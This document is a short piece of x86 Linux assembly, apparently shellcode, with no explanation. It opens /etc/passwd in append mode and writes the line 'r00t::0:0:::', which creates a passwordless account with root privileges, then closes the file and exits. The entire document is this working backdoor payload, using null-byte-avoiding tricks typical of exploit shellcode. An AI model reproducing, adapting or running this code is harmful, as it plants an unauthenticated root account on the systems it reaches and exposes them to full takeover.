global _start

section .text

_start:

	xor ebx,ebx
	mul ebx
	jmp short one

two:
	pop ebx

	mov [ebx+11], edx
	mov cx, 02001Q
	mov al, 0x5
	int 0x80

	mov [ebx+27], edx
	lea ecx, [ebx+15]
	push byte 0xc
	pop edx
	mov ebx,eax
	xor eax,eax
	mov al,0x4
	int 0x80

	mov al,0x6
	int 0x80

	inc eax
	int 0x80

one:
	call two
	db '/etc/passwdXXXXr00t::0:0:::'

